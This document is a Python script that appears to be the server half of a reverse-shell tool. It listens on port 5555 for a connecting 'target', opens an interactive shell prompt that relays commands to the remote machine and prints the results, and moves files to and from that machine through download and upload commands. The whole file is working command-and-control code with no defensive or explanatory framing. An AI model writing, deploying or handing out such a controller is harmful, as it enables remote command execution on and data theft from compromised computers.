import socket
import json
import os
import time

HOST = "127.0.0.1"
PORT = 5555

target = None
ip = None


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            chunk = target.recv(1024).decode().rstrip()
            if not chunk:
                raise ConnectionError("Disconnected")
            data += chunk
            return json.loads(data)
        except ValueError:
            continue


def server_send_stream(file_name):
    """Handles 'download': Sends a file from the Server down to the Client."""
    try:
        if not os.path.exists(file_name):
            target.send(b"[-] ERROR: File not found on server.")
            print(f"[-] Local file '{file_name}' does not exist.")
            return

        # 1. Get the exact size of the file
        file_size = os.path.getsize(file_name)
        
        # 2. Tell the client the file size first
        target.send(str(file_size).encode())
        time.sleep(0.1)

        # 3. Stream the raw file data
        with open(file_name, 'rb') as f:
            chunk = f.read(1024)
            while chunk:
                target.send(chunk)
                chunk = f.read(1024)
        print(f"[+] Successfully sent '{file_name}' down to the client.")
    except Exception as e:
        print(f"[-] Send stream failure: {str(e)}")


def server_recv_stream(file_name):
    """Handles 'upload': Receives a file pushed up from the Client to the Server."""
    try:
        # 1. Read the file size heading sent by the client
        file_size_str = target.recv(1024).decode()
        if "ERROR" in file_size_str:
            print(file_size_str)
            return
            
        file_size = int(file_size_str)
        print(f"[*] Incoming upload size: {file_size} bytes. Writing file to server drive...")

        # 2. Open and create the file fresh on the server side
        with open(file_name, 'wb') as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk = target.recv(min(1024, file_size - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)
                
        print(f"[+] Upload successful! '{file_name}' created on server side.")
    except Exception as e:
        print(f"[-] Recv stream failure: {str(e)}")


def target_communication():
    while True:
        try:
            command = input('* Shell~%s: ' % str(ip)).strip()
            if not command:
                continue

            reliable_send(command)

            if command == 'quit':
                break
            elif command == 'clear':
                os.system('clear')
            elif command[:3] == 'cd ':
                pass
            elif command[:8] == 'download':
                # Server sends file down to client
                server_send_stream(command[9:])
            elif command[:6] == 'upload':
                # Server receives file uploaded from client
                server_recv_stream(command[7:])
            else:
                result = reliable_recv()
                print(result)
        except Exception as e:
            print(f"[-] Server loop error: {str(e)}")
            break


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((HOST, PORT))
print('[+] Listening For Incoming Connections on 5555...')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
target.close()
sock.close()
